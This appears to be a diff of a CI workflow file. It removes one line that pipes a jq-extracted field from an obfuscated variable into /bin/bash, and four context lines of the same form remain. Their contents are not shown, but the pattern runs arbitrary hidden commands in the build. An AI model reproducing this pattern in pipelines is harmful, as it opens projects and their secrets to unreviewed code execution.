@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$do37539" | jq -r .dom586 | /bin/bash
           echo $cycty08 | jq -r .sdsn648 | /bin/bash
           echo $lwg65 | jq -r .f338 | /bin/bash
-          printf '%s' "$u09" | jq -r .ykipn12 | /bin/bash
           printf '%s' "$ahb13" | jq -r .pbyh60 | /bin/bash
 
       - name: Store artifact
